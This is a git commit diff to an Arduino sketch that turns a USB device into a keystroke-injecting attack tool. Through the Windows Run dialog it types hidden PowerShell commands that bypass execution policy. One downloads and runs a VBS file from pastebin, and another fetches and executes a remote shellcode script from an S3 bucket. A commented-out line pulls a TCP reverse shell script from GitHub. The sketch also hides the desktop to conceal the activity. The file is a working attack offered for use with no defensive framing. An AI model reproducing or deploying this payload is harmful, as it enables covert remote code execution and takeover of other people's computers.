0fc0a41d4f9e5453a673ee05bca828c31091372e
vulware <38492689+vulware@users.noreply.github.com>
2018-04-19 20:46:29 +0530

    Update Multi One Liner.ino

--- Multi One Liner.ino
+++ Multi One Liner.ino
@@ -1,5 +1,6 @@
 /*
-   Generated with <3 by Dckuino.js, an open source project !
+  One line powershell,
+  Executing run command in first 3secs than 2 payload in 10 seconds .
 */
 
 #include "Keyboard.h"
@@ -18,7 +19,7 @@ void setup()
   Keyboard.begin();
 
   // Wait 500ms
-  
+
   delay(3000);
   //First Payload
   Keyboard.press(KEY_LEFT_GUI);
@@ -31,31 +32,38 @@ void setup()
   Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs");
   delay(100);
   typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
 
   //Control D (desktop)
-  delay(400);
+  delay(1000);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');
   Keyboard.releaseAll();
-  
+
+
   //Second Payload in next 10 Seconds
   delay(10000);
-  
+
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
-  delay(200);
+  delay(100);
   Keyboard.releaseAll();
   delay(100);
 
   ////Direct Powershell Listener (One Liner).
-  Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');\"");  
+  Keyboard.print("powershell -W hidden -NoLogo -NonInteractive -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');\"");
   delay(100);
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
-  delay(400);
 
+  //Control D (desktop)
+  delay(1000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
 
+  //  delay(400);
   //  //nishan reverse shell
   //  Keyboard.press(KEY_LEFT_GUI);
   //  Keyboard.press('r');
@@ -63,13 +71,12 @@ void setup()
   //
   //  delay(1000);
   //  //Keyboard.print("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulware/powershell-reverse-shell-/master/powershell%20tcp%20reverse%20shell.ps1');\"");
-  //  //Keyboard.print("powershell -windowstyle hidden \"IEX (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/save.vbs'); Start-Process ‘%Temp%\\save.vbs’\"");
-  //
+
   //  delay(100);
   //  typeKey(KEY_RETURN);
   //
   //  //Control D (desktop)
-  //  delay(400);
+  //  delay(1000);
   //  Keyboard.press(KEY_LEFT_GUI);
   //  Keyboard.press('d');
   //  Keyboard.releaseAll();
